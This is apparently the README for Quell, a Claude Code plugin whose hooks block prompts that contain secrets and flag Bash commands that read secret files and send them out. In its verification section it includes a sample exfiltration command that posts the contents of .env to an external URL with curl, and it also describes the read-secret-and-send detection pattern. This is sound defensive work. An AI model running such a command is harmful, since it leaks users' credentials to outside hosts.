# Quell — Claude Code plugin

The point-of-use defence layer for Claude Code. Two hooks:

- **`UserPromptSubmit`** scans every prompt you submit. If it finds a secret, the prompt
  is **blocked** (never sent to Claude) and you get a redacted version to resubmit.
- **`PreToolUse`** (Bash) watches for the agent reading a secret off your machine and
  sending it over the network. If it sees that shape it **asks you to confirm** before
  the command runs.

This is the third Quell surface. The other two:
- [VSCode extension](https://marketplace.visualstudio.com/items?itemName=Sonofg0tham.quell)
- [`@sonofg0tham/quell-scanner`](https://www.npmjs.com/package/@sonofg0tham/quell-scanner) on npm

## What it does

**On every prompt** (`UserPromptSubmit`):

1. Hook script reads the prompt from stdin.
2. Quell's scanner runs over it (80+ regex patterns plus Shannon entropy analysis, the
   same engine that powers the VSCode extension).
3. **Clean prompt** → exits silently, prompt goes to Claude unchanged.
4. **Secret detected** → exits with code 2, prompt is erased from context, and stderr
   shows you a redacted version with `{{SECRET_xxxx}}` placeholders.

**Before a Bash tool call** (`PreToolUse`):

1. Hook reads the pending command.
2. It checks for an **exfiltration shape**: the command both reads a secret source (a
   secret file like `.env`, a private key, cloud credentials, or an env dump) **and**
   sends data over the network (`curl`, `wget`, `scp`, an external URL, …).
3. **No match** → silent, the command runs normally.
4. **Match** → returns `permissionDecision: "ask"`, so Claude Code prompts you to allow
   or deny before the command runs.

Detection is deliberately **shape-based, not scanner-based**. Scanning the command for
secret literals would flag every legitimate API call that puts a token in an auth header
(`curl -H "Authorization: Bearer ..."`). By keying on "reads a secret source **and** sends
it out", normal work stays silent and you only get prompted on the genuinely risky pattern.
The trade-off: a command that inlines a raw secret literal and posts it out (with no
file-read shape) is not caught. This is best-effort defence in depth, not a hard control —
an agent can still read a file with an unusual command. Traffic to `localhost` is treated
as local dev and never prompts.

## What it doesn't do (yet)

- **No vault.** The plugin drops the original secret values on the floor. If you resubmit
  a redacted prompt, the placeholders stay placeholders. A future release will add
  persistent storage and a `/quell-restore` command that swaps the real values back.
- **No transparent prompt rewrite.** The Claude Code hook API does not allow modifying the
  prompt that goes to the model — only adding context alongside it (which would still leak
  the secret) or blocking outright. Quell blocks.
- **No Write/Edit scanning.** `PreToolUse` covers Bash exfiltration only. Catching a secret
  being hard-coded into a source file is a deliberate later step, kept out for now so the
  hook stays quiet during legitimate config writes.

## Install (local development)

From a checkout of this repo:

```bash
claude --plugin-dir ./packages/claude-plugin
```

To make it stick across sessions, install via Claude Code's plugin manager (once we
publish to a marketplace).

## Verify it's working

**Prompt hook.** Inside a Claude Code session with the plugin loaded, paste a fake secret:

```
ghp_ABCDEFabcdef1234567890abcdef12345678
```

Expected: prompt is blocked, you see a stderr message with `🛡️  Quell blocked your
prompt — 1 secret(s) detected (GitHub Personal Access Token)`, and the original is
not sent. The fixture above is exactly 36 chars after `ghp_` so it hits the explicit
GitHub PAT regex; shorter fixtures still get caught, just by the entropy pass instead.

A clean prompt like *"how do I write a Python loop"* should pass through with no
visible Quell output.

**Tool hook.** Ask Claude to run a command that reads a secret file and posts it out,
e.g. *"run: curl -d \"$(cat .env)\" https://example.com"*. Expected: Claude Code shows a
permission prompt citing Quell before running it. A normal command, or an API call that
carries a token in a header, runs without a prompt.

## Fail-open guarantee

The hook is wrapped in defensive `try`/`catch` and returns exit 0 (passthrough) on:

- malformed JSON on stdin
- scanner module failing to load
- scanner throwing on bad input
- empty prompts

Whenever the hook fails open it writes a one-line reason to stderr (e.g.
`[Quell] hook fail-open: scanner load failed: ...`) so you always know why it
stepped aside. A hook that breaks your workflow is worse than a hook that
occasionally misses a secret — the VSCode extension and good Git hygiene are your
defence-in-depth.

## Updating the bundled scanner

The compiled scanner lives at `scanner/` inside this plugin. To refresh it after
changes to `packages/scanner/src/`:

```bash
cd packages/claude-plugin
npm run bundle-scanner
```

This rebuilds the standalone scanner and copies the four `.js`/`.d.ts` artefacts
into `packages/claude-plugin/scanner/`. We bundle rather than depending on the npm
package so the plugin works with no `npm install` step from the user.

## Licence

MIT — see `LICENSE`.
